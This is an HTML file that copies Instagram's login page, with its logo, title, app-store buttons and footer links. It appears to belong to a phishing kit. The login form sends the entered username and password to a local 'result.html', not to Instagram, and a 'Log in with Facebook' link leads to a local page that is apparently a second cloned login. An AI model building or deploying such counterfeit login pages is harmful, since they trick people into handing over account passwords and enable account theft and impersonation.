<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram</title>
    <style>
        .app-download p {
            color: grey;
        }
        .login-with-fb img {
            height: 20px; /* Adjust the size of the Facebook logo as needed */
            margin-right: 8px; /* Add some space between the logo and the text */
            vertical-align: middle; /* Align the logo vertically with the text */
        }
        form button {
            cursor: pointer; /* Add this line to make the cursor a hand icon on hover */
        }
        form input {
            color: black; /* User input text color */
        }
    </style>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form action="result.html" method="post">
                    <label for="email" class="sr-only">Phone number, username, or email</label>
                    <input id="email" name="email" placeholder="Phone number, username, or email" />

                    <label for="password" class="sr-only">Password</label>
                    <input id="password" name="password" type="password" placeholder="Password" />

                    <button type="submit">Log In</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div class="flex align-items-center">
                        <img src="./img/fb.jpg" alt="Facebook Logo" />
                        <a href="./FB/FB.html">Log in with Facebook</a>
                    </div>
                    <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p style="color: black;">Get the app.</p>
                <div class="flex justify-content-center">
                    <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank">
                        <img src="./img/apple-button.png" alt="Apple Store logo" title="Apple Store logo" />
                    </a>
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en" target="_blank">
                        <img src="./img/googleplay-button.png" alt="Google Play logo" title="Google Play logo" />
                    </a>
                </div>
            </div>
        </section>
    </main>
   
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="https://about.instagram.com/">About</a></li>
            <li><a href="https://help.instagram.com/">Help</a></li>
            <li><a href="https://about.instagram.com/blog">Blog</a></li>
            <li><a href="https://developers.facebook.com/docs/instagram">Api</a></li>
            <li><a href="https://about.instagram.com/about-us/careers">Careers</a></li>
            <li><a href="https://www.instagram.com/legal/privacy/">Privacy</a></li>
            <li><a href="https://www.instagram.com/legal/terms/">Terms</a></li>
            <li><a href="https://www.instagram.com/explore/locations/">Locations</a></li>
            <li><a href="https://www.instagram.com/creators">Top Accounts</a></li>
            <li><a href="https://help.instagram.com/351460621611097">Hashtags</a></li>
            <li><a href="https://help.instagram.com/111923612310997">Language</a></li>
        </ul>
        <p class="copyright">Â© 2024 Instagram from Facebook</p>
    </footer>
</body>
</html>
